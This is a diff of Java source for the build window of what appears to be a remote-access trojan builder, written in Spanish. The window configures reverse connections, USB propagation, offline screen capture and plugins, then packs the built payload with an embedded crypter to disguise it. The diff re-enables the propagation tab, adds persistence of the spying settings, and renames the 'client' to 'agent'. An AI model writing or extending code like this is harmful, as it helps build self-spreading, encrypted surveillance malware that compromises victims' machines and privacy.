@@ -194,7 +194,7 @@ public class CrearCliente extends JFrame {
         this.tabs.addTab("Conexión", Util.cargarIcono16("/resources/connect.png"), this.panConexion);
         this.tabs.addTab("Instalar", Util.cargarIcono16("/resources/puerto.png"), this.panelInstalar);
         this.tabs.addTab("Cifrado", Util.cargarIcono16("/resources/key.png"), this.panelCifrado);
-//        this.tabs.addTab("Propagación", Util.cargarIcono16("/resources/virus.png"), this.panelPropagacion);
+        this.tabs.addTab("Propagación", Util.cargarIcono16("/resources/virus.png"), this.panelPropagacion);
         this.tabs.addTab("Captura off-line", Util.cargarIcono16("/resources/spy.png"), this.panelEspiar);
         this.tabs.addTab("Funciones", Util.cargarIcono16("/resources/grid16.png"), this.panelOpciones);
         this.tabs.addTab("Plugins", Util.cargarIcono16("/resources/plugin.png"), this.panelPlugins);
@@ -262,8 +262,8 @@ public class CrearCliente extends JFrame {
             this.panConexion.getDelay().setValue(Integer.parseInt((String) p.obtenerParametro("delay")));
             this.panConexion.getConexionInversa().setSelected(Boolean.valueOf((String) p.obtenerParametro("inversa")));
             this.panelCifrado.getKey().setText((String) p.obtenerParametro("clave_acceso"));
-            this.panelEspiar.getCapturaOfflinePantalla().setSelected(Boolean.valueOf((String) p.obtenerParametro("off-escritorio")));
             try {
+                this.panelEspiar.getCapturaOfflinePantalla().setSelected((Boolean) p.obtenerParametro("off-escritorio"));
                 this.panelEspiar.getDelayCapturaPantalla().setValue(Integer.parseInt((String) p.obtenerParametro("off-escritorio-delay")));
             } catch (Exception e) {
             }
@@ -303,8 +303,10 @@ public class CrearCliente extends JFrame {
         perfil.agregarParametro("tipoConexion", panConexion.getComboProtocolo().getSelectedIndex());
         perfil.agregarParametro("ssl", String.valueOf(panConexion.getChkSSL().isSelected()));
         perfil.agregarParametro("puerto", panConexion.getPuerto().getValue().toString());
-//        perfil.agregarParametro("puerto2", panConexion.getPuerto2().getValue().toString());
         perfil.agregarParametro("delay", String.valueOf(panConexion.getDelay().getValue()));
+
+        perfil.agregarParametro("off-escritorio", this.panelEspiar.getCapturaOfflinePantalla().isSelected());
+        perfil.agregarParametro("off-escritorio-delay", this.panelEspiar.getDelayCapturaPantalla().getValue());
 
         perfil.agregarParametro("usb", String.valueOf(panelPropagacion.getCheckUSB().isSelected()));
         perfil.agregarParametro("nombre_usb", panelPropagacion.getNombreUSB().getText());
@@ -387,7 +389,7 @@ public class CrearCliente extends JFrame {
         btnGuardarPerfiles = new JButton();
         this.logServer = new JTextArea();
         panelBinder = new JPanel();
-        setTitle("Construir Cliente");
+        setTitle("Construir Agente");
         this.tabs.setFont(new Font(tipoLetra, 1, 14));
 //###############################################################################################################3
 //                            Perfiles
@@ -489,7 +491,7 @@ public class CrearCliente extends JFrame {
         this.panelBinder.add(pnlOpcionesBinder, BorderLayout.EAST);
 
 //###############################################################################################################
-//                            CONSTRUIR SERVER
+//                            CONSTRUIR AGENTE
 //###############################################################################################################
         JToolBar barraInferior = new JToolBar();
         barraInferior.add(this.btnCrearCliente);
@@ -501,13 +503,13 @@ public class CrearCliente extends JFrame {
         this.panelConstruir.setLayout(new BorderLayout());
         panelConstruir.add(scrollLog, BorderLayout.CENTER);
         panelConstruir.add(barraInferior, BorderLayout.SOUTH);
-        this.btnCrearCliente.setText("Crear Cliente");
+        this.btnCrearCliente.setText("Crear Agente");
         this.btnCrearCliente.setIcon(Util.cargarIcono16("/resources/computer.png"));
         this.btnCrearCliente.setToolTipText("Crea el cliente y guarda el perfil actual.");
         this.btnCrearCliente.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
-                CrearCliente.this.CrearClienteActionPerformed(evt);
+                CrearCliente.this.CrearAgenteActionPerformed(evt);
             }
         });
         this.btnGuardarPerfiles.setText("Guardar perfil");
@@ -591,8 +593,8 @@ public class CrearCliente extends JFrame {
         return cfg;
     }
 
-    private void CrearClienteActionPerformed(ActionEvent evt) {
-        this.cd.setDialogTitle("Guardar Cliente");
+    private void CrearAgenteActionPerformed(ActionEvent evt) {
+        this.cd.setDialogTitle("Guardar Agente");
         this.cd.setDialogType(1);
         this.cd.setFileFilter(new FileNameExtensionFilter("Ejecutable Java", new String[]{"jar"}));
         if (perfil != null) {
@@ -605,7 +607,7 @@ public class CrearCliente extends JFrame {
             try {
 
                 agregarLog("=======================================================");
-                agregarLog("\t\tCreando Cliente");
+                agregarLog("\t\tCreando Agente");
                 agregarLog("=======================================================");
 
                 String protocolo = "1";
@@ -644,7 +646,7 @@ public class CrearCliente extends JFrame {
                 //AGREGO ARCHIVO CONFIGURACION V2.0
                 try {
 //                    agregarLog("=======================================================");
-                    agregarLog("\tEscribiendo configuración en el cliente");
+                    agregarLog("\tEscribiendo configuración en el agente");
                     ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                     SerializarUtil.escribirStream(armarArchivoConfig(), outAd);
                     salida.putNextEntry(new JarEntry("cfg.dat"));
@@ -841,9 +843,9 @@ public class CrearCliente extends JFrame {
                 salida = null;
                 input = null;
                 agregarLog("========================================================================================");
-                this.agregarLog(new StringBuilder().append("Cliente creado correctamente...\n").append(destino.getAbsolutePath()).toString());
+                this.agregarLog(new StringBuilder().append("Agente creado correctamente...\n").append(destino.getAbsolutePath()).toString());
                 this.agregarLog("Tamaño cliente:" + Util.convertirBytes(destino.length()));
-                JOptionPane.showMessageDialog(this, new StringBuilder().append("Cliente creado correctamente. Se procede a cifrar...\n").append(destino.getAbsolutePath()).toString());
+//                JOptionPane.showMessageDialog(this, new StringBuilder().append("Cliente creado correctamente. Se procede a cifrar...\n").append(destino.getAbsolutePath()).toString());
                 cifrarArchivo(destino, destinoCifrado, true);
             } catch (IOException ex) {
                 ex.printStackTrace();
@@ -947,7 +949,7 @@ public class CrearCliente extends JFrame {
     private void cifrarArchivo(File original, File destino, boolean eliminar) {
         try {
             agregarLog("=======================================================");
-            agregarLog("\t\tCreando Cliente Cifrado");
+            agregarLog("\t\tCreando Agente Cifrado");
             agregarLog("=======================================================");
             JarInputStream input = new JarInputStream(getClass().getResourceAsStream("/extras/lib/QoopoRTCrypter.jar"));
             FileOutputStream fout = new FileOutputStream(destino);
@@ -962,7 +964,7 @@ public class CrearCliente extends JFrame {
                 archivo.setContenido(ArchivoUtil.bytesArchivo(original));
                 lst.add(archivo);
                 agregarLog("=======================================================");
-                agregarLog("\tAgregando Cliente");
+                agregarLog("\tAgregando Agente");
                 ByteArrayOutputStream outAd = new ByteArrayOutputStream();
                 SerializarUtil.escribirStream(lst, outAd);
                 salida.putNextEntry(new JarEntry("dat.dat"));
@@ -1010,9 +1012,9 @@ public class CrearCliente extends JFrame {
                     original.deleteOnExit();
                 }
             }
-            this.agregarLog(new StringBuilder().append("Cliente cifrado correctamente...\n").append(destino.getAbsolutePath()).toString());
+            this.agregarLog(new StringBuilder().append("Agente cifrado correctamente...\n").append(destino.getAbsolutePath()).toString());
             this.agregarLog("Tamaño cliente:" + Util.convertirBytes(destino.length()));
-            JOptionPane.showMessageDialog(this, new StringBuilder().append("Cliente cifrado correctamente...\n").append(destino.getAbsolutePath()).toString());
+            JOptionPane.showMessageDialog(this, new StringBuilder().append("Agente cifrado correctamente...\n").append(destino.getAbsolutePath()).toString());
 
         } catch (IOException ex) {
             Logger.getLogger(CrearCliente.class.getName()).log(Level.SEVERE, null, ex);
